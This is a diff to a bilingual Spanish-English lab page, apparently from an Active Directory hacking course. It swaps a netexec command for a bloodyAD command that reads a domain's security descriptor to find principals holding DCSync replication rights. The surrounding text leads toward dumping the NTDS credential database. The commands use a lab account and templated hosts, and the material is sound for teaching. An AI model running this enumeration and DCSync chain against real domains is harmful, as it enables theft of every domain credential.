@@ -35,10 +35,10 @@ cat ntds_dump.txt</pre>
     <pre>export DC={{ ad_dc_ip }}
 
 # BloodHound: "Find Principals with DCSync Rights"
-# A mano con netexec:
-nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M daclread \
-  -o TARGET_DN="DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" ACTION=read \
-  | grep -i 'Replicating'</pre>
+# A mano con bloodyAD (nxc ldap -M daclread no funciona contra este DC, ver AD 02):
+bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
+  get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
+  | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'</pre>
     <p>El grupo <code>IT Support</code> aparece con los GUID de replicación (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes y Get-Changes-All). Como en el lab AD 09 te añadiste a ese grupo, ya heredas el derecho — puedes confirmarlo tú mismo.</p>
 
     <h3>3 · Replicar el NTDS (comando real, contra Windows funciona así)</h3>
@@ -82,10 +82,10 @@ HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_DC0
     <pre>export DC={{ ad_dc_ip }}
 
 # BloodHound: "Find Principals with DCSync Rights"
-# By hand with netexec:
-nxc ldap $DC -u 'svc.readonly' -p 'ReadOnly123!' -M daclread \
-  -o TARGET_DN="DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" ACTION=read \
-  | grep -i 'Replicating'</pre>
+# By hand with bloodyAD (nxc ldap -M daclread does not work against this DC, see AD 02):
+bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
+  get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
+  | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'</pre>
     <p>The <code>IT Support</code> group shows up with the replication GUIDs (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes and Get-Changes-All). Since you added yourself to that group in lab AD 09, you already inherit the right — you can confirm this yourself.</p>
 
     <h3>3 · Replicate the NTDS (real command, works exactly like this against Windows)</h3>
